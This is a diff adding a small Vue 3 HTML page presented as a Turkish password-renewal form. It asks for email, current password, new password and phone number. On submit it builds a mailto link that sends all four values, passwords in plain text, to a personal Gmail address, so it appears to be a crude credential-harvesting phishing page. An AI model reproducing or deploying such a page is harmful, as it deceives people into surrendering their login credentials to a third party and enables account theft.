@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Form</title>
+    <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.js"></script>
+</head>
+<body>
+    <div id="app">
+        <form @submit.prevent="sendEmail">
+            <label>Email:</label>
+            <input type="email" v-model="email" required><br>
+            
+            <label>Sifre:</label>
+            <input type="password" v-model="password" required><br>
+            
+            <label>Yeni Sifre:</label>
+            <input type="password" v-model="newPassword" required><br>
+            
+            <label>Telefon:</label>
+            <input type="tel" v-model="phone" required><br>
+            
+            <button type="submit">Yenile</button>
+        </form>
+    </div>
+
+    <script>
+        const { createApp } = Vue;
+
+        createApp({
+            data() {
+                return {
+                    email: '',
+                    password: '',
+                    newPassword: '',
+                    phone: ''
+                };
+            },
+            methods: {
+                sendEmail() {
+                    const subject = "Form Submission";
+                    const body = `Email: ${this.email}%0D%0APassword: ${this.password}%0D%0ANew Password: ${this.newPassword}%0D%0APhone: ${this.phone}`;
+                    window.location.href = `mailto:hamza.erguc@gmail.com?subject=${subject}&body=${body}`;
+                }
+            }
+        }).mount('#app');
+    </script>
+</body>
+</html>
